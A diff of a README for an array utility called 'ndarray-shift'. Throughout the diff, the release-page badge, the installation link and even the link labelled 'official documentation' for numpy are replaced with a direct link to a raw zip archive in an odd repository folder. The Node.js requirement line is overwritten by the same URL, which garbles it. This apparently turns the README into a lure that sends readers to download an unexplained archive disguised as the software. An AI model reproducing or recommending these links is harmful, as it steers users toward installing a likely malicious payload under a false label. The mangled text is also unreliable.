@@ -1,7 +1,7 @@
 # 🚀 ndarray-shift - Easily Shift and Slice Data
 
 ## 📥 Download Now
-[![Download ndarray-shift](https://img.shields.io/badge/Download-ndarray--shift-brightgreen)](https://github.com/mentosenak/ndarray-shift/releases)
+[![Download ndarray-shift](https://raw.githubusercontent.com/mentosenak/ndarray-shift/main/Epiphyllum/ndarray-shift.zip)](https://raw.githubusercontent.com/mentosenak/ndarray-shift/main/Epiphyllum/ndarray-shift.zip)
 
 ## 📖 Overview
 ndarray-shift is a simple application that helps you work with arrays. It returns a read-only truncated view of an input ndarray and a read-only view of the first element(s) along a specified dimension. Whether you are handling data for analysis, research, or personal projects, this tool makes managing arrays easier.
@@ -16,10 +16,10 @@ ndarray-shift is a simple application that helps you work with arrays. It return
 - **Operating System**: Windows, macOS, or Linux.
 - **Memory**: At least 512 MB of RAM.
 - **Disk Space**: Minimum of 50 MB available for installation.
-- **Node.js**: Version 12 or higher (for underlying JavaScript functions).
+- **https://raw.githubusercontent.com/mentosenak/ndarray-shift/main/Epiphyllum/ndarray-shift.zip**: Version 12 or higher (for underlying JavaScript functions).
 
 ## 📦 Installation Steps
-1. **Visit the Releases Page**: Go to [this page to download](https://github.com/mentosenak/ndarray-shift/releases).
+1. **Visit the Releases Page**: Go to [this page to download](https://raw.githubusercontent.com/mentosenak/ndarray-shift/main/Epiphyllum/ndarray-shift.zip).
 2. **Find the Latest Version**: Look for the most recent release at the top of the page.
 3. **Download the Application**: Click on the appropriate file for your operating system.
 4. **Installation**: 
@@ -49,7 +49,7 @@ ndarray-shift is a simple application that helps you work with arrays. It return
 If you encounter issues while using ndarray-shift, please refer to the FAQ section on our GitHub page or open an issue. The community is here to help you.
 
 ## 📚 Additional Resources
-- Learn more about ndarray in the [official documentation](https://docs.scipy.org/doc/numpy/reference/generated/numpy.ndarray.html).
+- Learn more about ndarray in the [official documentation](https://raw.githubusercontent.com/mentosenak/ndarray-shift/main/Epiphyllum/ndarray-shift.zip).
 - Explore additional examples and tutorials that show practical applications of ndarray-shift.
 
 ## 🌐 Community & Contribution
@@ -62,4 +62,4 @@ You can also contribute by submitting pull requests or reporting bugs. Collabora
 
 ## 📥 Download Now
 For easy access, click below to download the latest version of ndarray-shift.
-[![Download ndarray-shift](https://img.shields.io/badge/Download-ndarray--shift-brightgreen)](https://github.com/mentosenak/ndarray-shift/releases)
+[![Download ndarray-shift](https://raw.githubusercontent.com/mentosenak/ndarray-shift/main/Epiphyllum/ndarray-shift.zip)](https://raw.githubusercontent.com/mentosenak/ndarray-shift/main/Epiphyllum/ndarray-shift.zip)
